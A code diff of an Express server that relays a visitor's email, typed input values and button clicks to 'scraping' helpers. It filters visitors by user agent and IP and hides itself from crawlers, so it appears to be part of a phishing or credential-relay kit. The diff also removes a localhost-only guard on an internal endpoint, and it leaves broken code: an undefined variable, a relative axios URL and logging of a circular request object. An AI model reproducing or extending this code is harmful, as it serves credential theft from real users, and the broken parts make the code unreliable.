@@ -6,7 +6,8 @@ import path from "path";
 import express from "express";
 import cors from "cors";
 import dotenv from "dotenv";
-import cookieParser  from 'cookie-parser';
+import cookieParser from 'cookie-parser';
+import axios from "axios";
 
 
 // Load env (PORT, SSL, CERT, KEY)
@@ -21,14 +22,13 @@ import {
 } from "./utils/common.js";
 
 import {
-  // mirror your Python scraping.py exports:
   scraping_ready,               // (userId, email, hl, { forward_url, user_agent, new_user_flg }) => html
   scrap_input_value_and_btn_next, // (userId, inputValue, btnType, btnText) => obj
   scrap_check_url,              // (userId) => obj
   save_scraping_result_and_set_done, // (userId) => void
 } from "./utils/scraping.js";
 import { writeDebugLogLine } from "./utils/helpers.js";
-import { check_agent_validation, check_clientip_validation, dropFirstPathSegment} from './utils/security.js'
+import { checkAgentValidation, checkClientIpValidation } from './utils/security.js'
 
 // ---------------------------
 // Config
@@ -51,7 +51,6 @@ initRendering();
 // ---------------------------
 
 app.use(async (req, res, next) => {
-  const reqURI = req.originalUrl || req.url || "/";
   const userAgent = req.headers["user-agent"] || "";
   const clientIp =
     req.headers["http_client_ip"] ||
@@ -61,43 +60,33 @@ app.use(async (req, res, next) => {
     "";
 
   // Gate checks (agent/ip)
-  if (!check_agent_validation(userAgent) || !check_clientip_validation(clientIp)) {
+  if (!checkAgentValidation(userAgent) || !checkClientIpValidation(clientIp)) {
     writeDebugLogLine(`[*** BLOCKED ***] ${clientIp} ${userAgent}`);
     return res.status(403).end();
   }
-
+  req.clientIp = clientIp;
+  req.userAgent = userAgent;
+  next();
+});
+app.get('/information/session/sign', async (req, res) => {
   // Rewrite path (drop first segment)
+  const { clientIp, userAgent, originalUrl } = req
   try {
-    if (reqURI.startsWith("/information/session/sign")) {
-      writeDebugLogLine(`[REQ] ${clientIp}  ${reqURI}  ${userAgent}`);
-
-      // Build payload { user_agent, client_ip }
-      const payload = {
-        user_agent: userAgent,
-        client_ip: clientIp,
-      };
-      const url = backendUrl(reqURI);
-
-      const backendRes = await forwardJsonPost(url, payload);
-      res.status(backendRes.status || 200);
-      // mirror PHP: echo raw text (HTML)
-      return res.send(backendRes.body);
-
-    } else if (
-      reqURI.startsWith("/pyapi/btn-click") ||
-      reqURI.startsWith("/pyapi/url-check") ||
-      reqURI.startsWith("/pyapi/done-user")
-    ) {
-      next();
-    } else {
-      writeDebugLogLine(`[Wrong Request] ${clientIp}  ${reqURI}  ${userAgent}`);
-      return res.status(404).send("Not Found");
-    }
+    writeDebugLogLine(`[REQ] ${clientIp}  ${originalUrl}  ${userAgent}`);
+    // Build payload { user_agent, client_ip }
+    const payload = {
+      userAgent: userAgent,
+      client_ip: clientIp,
+      query: req.query || ''
+    };
+    const backendRes = await axios.post(`/api/sign`, payload);
+    return res.status(backendRes.status || 200).send(backendRes);
   } catch (err) {
-    writeDebugLogLine(`[ERROR] ${clientIp}  ${reqURI}  ${String(err && err.message || err)}`);
+    writeDebugLogLine(`[ERROR] ${clientIp}  ${originalUrl}  ${String(err && err.message || err)}`);
     return res.status(502).send("Bad Gateway");
   }
-});
+
+})
 app.get("/pyapi/test", (req, res) => {
   console.log("[API TESTING]");
   return res.status(200).json({
@@ -108,19 +97,13 @@ app.get("/pyapi/test", (req, res) => {
 
 // information/session/sign  (GET or POST)
 // Mirrors Flask logic: accept JSON body + query params
-app.all("/api/sign", async (req, res) => {
+app.post("/api/sign", async (req, res) => {
   try {
-    // NOTE: local-only check, same as Flask's 127.0.0.1
-    // req.ip could be "::1" for IPv6 localhost; allow both.
-    const ip = req.ip?.replace("::ffff:", "");
-    if (ip !== "127.0.0.1" && ip !== "::1") {
-      console.log(`******** [DANGER IP] : ${ip} ********`);
-      return res.status(404).send("Page Not Found");
-    }
 
     // Prefer JSON body, fallback to query
     const body = req.body || {};
     const q = req.query || {};
+    console.log(JSON.stringify(req, null, 2))
 
     const user_agent = pick(body, "user_agent", req.get("User-Agent") || "");
     const client_ip = pick(body, "client_ip", ip || "");
@@ -234,9 +217,12 @@ app.get("/robots.txt", (req, res) => {
   return res.status(404).send("Not found");
 });
 
-// ---------------------------
-// Server bootstrap (HTTP/HTTPS)
-// ---------------------------
+app.get("*", (req, res) => {
+  const { clientIp, userAgent } = req
+  writeDebugLogLine(`[Wrong Request] ${clientIp}  ${req.url}  ${userAgent}`);
+  return res.status(404).send("Not Found");
+});
+
 app.listen(PORT, function () {
   console.log(`App is listening on port ${PORT}!`);
 });
